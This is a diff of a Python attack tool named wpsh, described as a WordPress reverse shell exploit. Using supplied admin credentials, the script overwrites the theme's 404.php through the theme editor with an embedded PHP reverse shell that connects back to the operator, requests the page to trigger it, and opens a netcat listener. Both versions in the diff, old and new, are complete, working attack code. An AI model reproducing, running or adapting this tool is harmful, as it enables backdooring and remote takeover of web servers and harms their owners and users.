@@ -7,7 +7,6 @@
 # wpsh v1.0.0  -  WordPress reverse shell exploit                              #
 #                                                                              #
 #                                                                              #
-#                                                                              #
 # GNU GENERAL PUBLIC LICENSE                                                   #
 #                                                                              #
 # This program is free software: you can redistribute it and/or modify         #
@@ -34,17 +33,13 @@ import re
 from pwn import log
 import argparse
 
-## General
-#
-# program constants
-
+# General constants
 SESSION = requests.Session()
-TIMEOUT = 2
 THEME = ""
-TRIGGER = ""
+TRIGGER_PAGE = ""
 PORT = 0
 
-# pentestmonkey reverse shell (https://github.com/pentestmonkey/php-reverse-shell/)
+# Copied from here: https://github.com/pentestmonkey/php-reverse-shell/
 PAYLOAD = """
 <?php
 set_time_limit (0);
@@ -54,14 +49,11 @@ $port = CHANGEPORT;       // CHANGE THIS
 $chunk_size = 1400;
 $write_a = null;
 $error_a = null;
-$shell = 'uname -a; w; id; /bin/sh -i';
+$shell = '/bin/sh -i';
 $daemon = 0;
 $debug = 0;
 
-// pcntl_fork is hardly ever available, but will allow us to daemonise
-// our php process and avoid zombies.  Worth a try...
 if (function_exists('pcntl_fork')) {
-	// Fork and have the parent process exit
 	$pid = pcntl_fork();
 	
 	if ($pid == -1) {
@@ -73,8 +65,6 @@ if (function_exists('pcntl_fork')) {
 		exit(0);  // Parent exits
 	}
 
-	// Make the current process a session leader
-	// Will only succeed if we forked
 	if (posix_setsid() == -1) {
 		printit("Error: Can't setsid()");
 		exit(1);
@@ -85,24 +75,15 @@ if (function_exists('pcntl_fork')) {
 	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
 }
 
-// Change to a safe directory
 chdir("/");
-
-// Remove any umask we inherited
 umask(0);
 
-//
-// Do the reverse shell...
-//
-
-// Open reverse connection
 $sock = fsockopen($ip, $port, $errno, $errstr, 30);
 if (!$sock) {
 	printit("$errstr ($errno)");
 	exit(1);
 }
 
-// Spawn shell process
 $descriptorspec = array(
    0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
    1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
@@ -179,114 +160,11 @@ function printit ($string) {
 ?> 
 """
 
-def parse_args() -> tuple:
-    parser = argparse.ArgumentParser(description="Get reverse shell from WordPress website")
-    parser.add_argument("-u", help="URL to the WordPress site (e.g., http://example.com/)", metavar="URL", required=True)
-    parser.add_argument("-au", help="WordPress admin username", metavar="ADMIN_USER", required=True)
-    parser.add_argument("-ap", help="WordPress admin password", metavar="ADMIN_PASS", required=True)
-    
-    parser.add_argument("-i", help="your local ip for the reverse shell", metavar="IP", required=True)
-    parser.add_argument("-p", type=int, help="your local port for the reverse shell", metavar="PORT", required=True)
-    args = parser.parse_args()
 
-    if(not args.u.startswith("http")):
-        log.error("Missing schema (http:// | https://)")
-        log.info("Adding http:// ...")
-        args.u = "http://" + args.u
-
-    if(not args.u.endswith("/")):
-        args.u += "/"
-
-    global PAYLOAD, PORT
-    PAYLOAD = PAYLOAD.replace("CHANGEIP", args.i).replace("CHANGEPORT", str(args.p))
-    PORT = args.p
-
-    return args.u, args.au, args.ap
-
-
-def extract_value(input: str) -> str:
-    return input.split("value=")[1].split('"')[1]
-
-
-def do_login(target :str, wp_user: str, wp_pass: str) -> bool:
-    SESSION.post(f"{target}wp-login.php", data = {
-        "log": wp_user,
-        "pwd": wp_pass,
-        "wp-submit": "Submit"
-    })
-
-    if(len(SESSION.cookies) <= 1):
-        return False
-    
-    return True
-
-def get_edition_page(target) -> str:
-    pages_url = SESSION.get(f"{target}wp-admin/theme-editor.php").text
-    try:
-        unparsed_url = re.findall(".*404.php.*", pages_url)[0]
-    except IndexError:
-        return ""
-    
-    return unparsed_url.split('"')[1]
-
-def do_backdoor(target: str, link: str):
-    content = SESSION.get(link).text
-
-    hidden_inputs = re.findall('<input type="hidden" .*?/>', content)
-
-    global THEME, TRIGGER
-    THEME = extract_value(hidden_inputs[4])
-    TRIGGER = extract_value(hidden_inputs[3])
-    data = {
-        "nonce": extract_value(hidden_inputs[0]),
-        "_wp_http_referer": extract_value(hidden_inputs[1]),
-        "newcontent": PAYLOAD,
-        "action": "edit-theme-plugin-file",
-        "file": TRIGGER,
-        "theme": THEME,
-        "docs-list": "",
-    }
-    return '"success":true' in SESSION.post(f"{target}wp-admin/admin-ajax.php", data=data).text
-
-def trigger_backdoor(target: str):
-    global TIMEOUT
-    sleep(TIMEOUT)
-    trigger_url = f"{target}wp-content/themes/{THEME}/{TRIGGER}"
-    log.info("GET " + trigger_url + "\n\n")
-    SESSION.get(trigger_url)
-
-
-def main(target: str, wp_user: str, wp_pass: str) -> bool:
-    log.info(f"Attempting to authenticate")
-    
-    if(not do_login(target, wp_user, wp_pass)):
-        log.critical("Failed to authenticate")
-        return False
-
-    log.success(f"Authentication succeeded")
-
-
-    editable = get_edition_page(target)
-    if(editable == ""):
-        log.critical("404.php not found, cannot get a shell")
-        return False
-    
-    log.success("Found 404.php at /" + editable.replace(target, ""))
-
-
-    if(not do_backdoor(target, editable)):
-        log.critical("Could not edit the 404.php page")
-        return False
-    
-    log.success(f"Backdoored successfully ...")
-
-    log.info("Triggering backdoor ...")
-
-    x = threading.Thread(target=trigger_backdoor, args=(target,), daemon=True)
-    x.start()
-    system(f"nc -nlp {PORT}")
-
-if __name__ == "__main__":
+def banner():
+    """
+        Display the script banner
+    """
     print("""\x1b[33m
  __      ____________      .__     
 /  \\    /  \\______   \\_____|  |__  
@@ -299,7 +177,152 @@ if __name__ == "__main__":
 =[ NullBrunk
 \x1b[0m
 """)
+
+
+def parse_args() -> tuple:
+    """
+        Parses the CLI given arguments
+        Returns the wordpress URL, admin's username and admin's password
+    """
+
+    parser = argparse.ArgumentParser(description="Get reverse shell from WordPress website")
+    parser.add_argument("-u", help="URL to the WordPress site", metavar="URL", required=True)
+    parser.add_argument("-au", help="WordPress admin username", metavar="ADMIN_USER", required=True)
+    parser.add_argument("-ap", help="WordPress admin password", metavar="ADMIN_PASS", required=True)
+    
+    parser.add_argument("-i", help="your local ip for the reverse shell", metavar="IP", required=True)
+    parser.add_argument("-p", help="your local port for the reverse shell", metavar="PORT", required=True, type=int)
+    args = parser.parse_args()
+
+    if(not args.u.startswith("http")):
+        log.error("Missing schema (http:// | https://)")
+        log.info("Adding http:// ...")
+        args.u = "http://" + args.u
+
+    if(not args.u.endswith("/")):
+        args.u += "/"
+
+    # Update the payload and the port variables
+    global PAYLOAD, PORT
+    PAYLOAD = PAYLOAD.replace("CHANGEIP", args.i).replace("CHANGEPORT", str(args.p))
+    PORT = args.p
+
+    return args.u, args.au, args.ap
+
+
+def extract_value(input: str) -> str:
+    """
+        Extract the value from the input's value attribute
+    """
+
+    return input.split("value=")[1].split('"')[1]
+
+
+def authenticate(target :str, wp_user: str, wp_pass: str) -> None:
+    """
+    Attempt to authenticate with the given credentials
+    """
+
+    log.info(f"Attempting to authenticate")
+
+    SESSION.post(f"{target}wp-login.php", data = {
+        "log": wp_user,
+        "pwd": wp_pass,
+        "wp-submit": "Submit"
+    })
+
+    if(len(SESSION.cookies) <= 1):
+        log.critical("Failed to authenticate")
+        exit()
+    
+    log.success(f"Authentication succeeded")
+
+
+def get_edition_page(target) -> str:
+    """
+        Returns the link to the 404.php edit page
+    """
+
+    pages_url = SESSION.get(f"{target}wp-admin/theme-editor.php").text
+    try:
+        unparsed_url = re.findall(".*404.php.*", pages_url)[0]
+    except IndexError:
+        log.critical("404.php not found")
+        exit()
+    
+    editable = unparsed_url.split('"')[1]
+    log.success("Found 404.php at /" + editable.replace(target, ""))
+
+    return editable
+
+
+def upload_reverse_shell(target: str, link: str) -> None:
+    """
+        Uploads the reverse shell by editing the 404.php theme file and replacing it 
+        by the Pentestmonkey PHP reverse shell.
+    """
+    
+    content = SESSION.get(link).text
+
+    hidden_inputs = re.findall('<input type="hidden" .*?/>', content)
+
+    global THEME, TRIGGER_PAGE
+    THEME = extract_value(hidden_inputs[4])
+    TRIGGER_PAGE = extract_value(hidden_inputs[3])
+    data = {
+        "nonce": extract_value(hidden_inputs[0]),
+        "_wp_http_referer": extract_value(hidden_inputs[1]),
+        "newcontent": PAYLOAD,
+        "action": "edit-theme-plugin-file",
+        "file": TRIGGER_PAGE,
+        "theme": THEME,
+        "docs-list": "",
+    }
+    if(not '"success":true' in SESSION.post(f"{target}wp-admin/admin-ajax.php", data=data).text):
+        log.critical("Could not edit the 404.php page")
+        exit()
+    log.success(f"Successfully uploaded the reverse shell")
+
+
+def trigger_backdoor(target: str):
+    """
+        Trigger the reverse shell by sending a GET request to the 404.php page
+    """
+    
+    log.info("Triggering the reverse shell ...")
+
+    # Wait for the netcat listener to start listening
+    sleep(1)
+
+    # Trigger the reverse shell
+    trigger_url = f"{target}wp-content/themes/{THEME}/{TRIGGER_PAGE}"
+    log.info("GET " + trigger_url + "\n\n")
+    SESSION.get(trigger_url)
+
+
+def main(target: str, wp_user: str, wp_pass: str) -> None:
+    
+    authenticate(target, wp_user, wp_pass)
+
+    editable = get_edition_page(target)
+
+    upload_reverse_shell(target, editable)
+
+    # We need to launch the triggerer first, and only then launch the listener. 
+    # Therefore, the triggerer needs to wait a little before triggering the backdoor.
+    
+    # Triggerrer
+    x = threading.Thread(target=trigger_backdoor, args=(target,), daemon=True)
+    x.start()
+    
+    # Listener
+    system(f"nc -nlp {PORT}")
+
+
+
+if __name__ == "__main__":
+    banner()
+
     target, wp_user, wp_pass = parse_args()
     main(target, wp_user, wp_pass)
-    log.success("Done")
 
